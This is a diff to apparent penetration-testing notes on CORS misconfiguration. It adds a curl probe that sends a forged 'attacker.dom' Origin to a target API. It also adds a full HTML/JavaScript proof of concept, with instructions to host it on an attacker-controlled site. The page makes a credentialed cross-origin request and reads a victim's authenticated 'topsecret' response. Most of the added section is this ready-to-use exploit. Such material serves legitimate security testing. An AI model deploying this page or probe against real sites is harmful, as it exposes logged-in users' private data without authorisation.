@@ -32,3 +32,29 @@ Response: -
 Access-Control-Allow-Origin: https://arbitr.ary/
 	-Referer or Origin values are sometimes reflected in the Access-Control-Allow-Origin response value
 	--any arbitrary domain is then allows to access the server response
+
+
+CORS Testing:
+
+curl --head -s 'http://target.dom/api/v1/secret' -H 'Origin: http://attacker.dom'
+	--check server Response header Access-Control-Allow-Origin: (if anything) if so, check if Access-Control-Allow-Credentials: true
+If Access-Control-Allow-Credentials: True
+host the following PoC on attack-controlled host within trusted Access-Controll-Allow-Origin:
+<!DOCTYPE html>
+<html><body>
+<h2>PoC</h2>
+<textarea rows="1" cols="1" id="pwn"></textarea><br>
+<button type="button" onclick="pwnCORS()">Exploit</button>
+<script>
+function pwnCORS() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("pwn").innerHTML = this.responseText;
+    }
+  };
+  xhttp.open("GET", "http://target.dom/api/v1/topsecret", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+</script></body></html>
